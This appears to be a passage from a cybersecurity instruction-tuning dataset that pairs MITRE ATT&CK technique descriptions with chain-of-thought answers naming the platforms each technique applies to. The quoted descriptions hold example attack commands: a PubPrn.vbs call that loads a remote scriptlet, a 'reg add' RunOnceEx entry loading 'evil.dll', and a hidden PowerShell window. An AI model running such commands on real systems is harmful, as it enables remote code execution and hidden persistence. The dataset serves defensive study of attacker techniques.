      "question": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "answer": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Script Proxy Execution: PubPrn (T1216.001);\nTechnique System Script Proxy Execution: PubPrn (T1216.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
      "answer": "The provided description is related to MITRE technique System Script Proxy Execution: PubPrn (T1216.001);\nTechnique System Script Proxy Execution: PubPrn (T1216.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
